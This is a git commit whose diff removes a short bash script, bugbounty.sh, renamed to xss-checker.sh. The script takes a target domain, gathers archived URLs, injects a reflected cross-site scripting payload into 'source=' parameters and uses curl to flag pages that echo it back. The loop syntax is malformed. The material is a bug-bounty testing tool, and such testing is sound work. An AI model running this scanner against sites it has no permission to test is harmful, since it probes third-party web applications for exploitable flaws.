5d00147ec6b5220b4413c6af7307ddb4705c09fe
ayiezola <ayiezola@users.noreply.github.com>
2021-06-09 17:22:09 +0800

    Rename bugbounty.sh to xss-checker.sh

--- bugbounty.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-
-echo "Masukkan target domain : "
-read target
-
-waybackurls $target | tee -a $target.txt
-
-cat $target.txt| gf xss | grep 'source=' | qsreplace '"><script>comfirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>comfirm(1)" && echo "$host \033[0;31mVulnerable\n"; done
